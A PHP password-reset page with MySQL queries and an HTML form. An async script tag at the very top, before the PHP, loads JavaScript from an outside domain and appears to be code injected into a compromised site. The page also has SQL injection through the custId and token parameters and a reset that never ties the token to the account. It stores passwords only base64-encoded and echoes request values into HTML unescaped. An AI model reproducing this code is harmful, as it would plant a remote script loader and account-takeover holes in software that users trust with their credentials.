<script type='text/javascript' async src='https://somelandingpage.com/3gGykjDJ?frm=script&_cid=0000000000000'></script><?php
require_once("../api/v1/include/config.php");
$dbConn=mysqli_connect( DBSERVER, DBUSERNAME, DBPASSWORD, DBNAME) or die ( "Database connection cannot be found" ) ;
$show_form = FALSE;

if(isset($_POST['reset_pass'])) {
if(isset($_POST['new_pass']) && isset($_POST['confirm_new_pass'])) {

		$password = ($_POST['new_pass']);
		$confirm_password = ($_POST['confirm_new_pass']);
		$custId = ($_POST['custId']);
		$token = ($_POST['token']);
		
		if(!$show_form) {
			$regex = "/^[0-9a-zA-Z\.\-!@#$%]{6,}$/";
		    if(!preg_match($regex,$password)){
		       echo "<p style='text-align:center'>Invalid password: choose a password with at the least 6 character.</p>";
		       $show_form = TRUE;
		    }
			/*else
			{
				  echo "<p style='text-align:center'>Your pass valid</p>";
			}*/
		}
	   
	    if(!$show_form) {
	   		if($password != $confirm_password){
		       echo "<p style='text-align:center'>Password and confirm password must be same.</p>";
		       $show_form = TRUE;
		    } 
	   	}
	  
	   	if(!$show_form) {
	   		//Set new password
	   		$password = base64_encode($password);
	   		$query = "UPDATE tbl_customers SET password='$password',passResetToken='' WHERE custId = $custId";
	   		if(mysqli_query($dbConn,$query)) {
	   			//mysqli_query($dbConn,"DELETE FROM tbl_customers WHERE custId=$custId AND token = '$token'");
	   			echo "<h2 style='text-align:center'>Password reset successfully. Thank you!</h2>";
	   		} else {
	   			echo "<p style='text-align:center'>There was an error: Try again please.</p>";
	   			$show_form = TRUE;
	   		}
	   		
	   	} else {
	   		echo "<br/><br/>";
	   	}
	} else {
		echo "You have to set both the fields!";
	}
}else $show_form = TRUE;
if($show_form) {
	$token = ($_GET['t']);
	$query = "SELECT custId FROM tbl_customers WHERE passResetToken = '$token'";
	$result = mysqli_query($dbConn,$query);
	$row = mysqli_fetch_assoc($result);
	extract($row);
	
	if($custId == "") {
		echo "<h2 style='text-align:center'>Password reset token has been used. Please do forgot password again.</h2>";
		return;
	}
?>
<!DOCTYPE html>
<html>

<head>

  <meta charset="UTF-8">

  <title><?=APP_TITLE;?> - Reset Password</title>

    <link rel="stylesheet" href="css/style.css" media="screen" type="text/css" />

</head>

<body>

 <span href="#" id="toggle-login" ><!--<img src="<?php echo BASE_URL .'images/app-logo.png'; ?>" style="padding-top:35px;" />--></span>

<div id="login">
  <div id="triangle"></div>
  <h1>Reset Password</h1>
  <form method="POST" action="<?php echo $_SERVER["REQUEST_URI"]; ?>" name="reset_pass">
    <input type="password" name="new_pass" id="new_pass" placeholder="Password"/>
    <input type="password" name="confirm_new_pass" id="confirm_new_pass" placeholder="Confirm Password" />
	<input type="hidden" value="<?php echo $custId; ?>" name="custId"/>
	<input type="hidden" value="<?php echo $token; ?>" name="token"/>
	<input type="submit" value="Reset" name="reset_pass"/>
  </form>
</div>
<?php } ?>
  <script src='http://codepen.io/assets/libs/fullpage/jquery.js'></script>

  <script src="js/index.js"></script>

</body>

</html>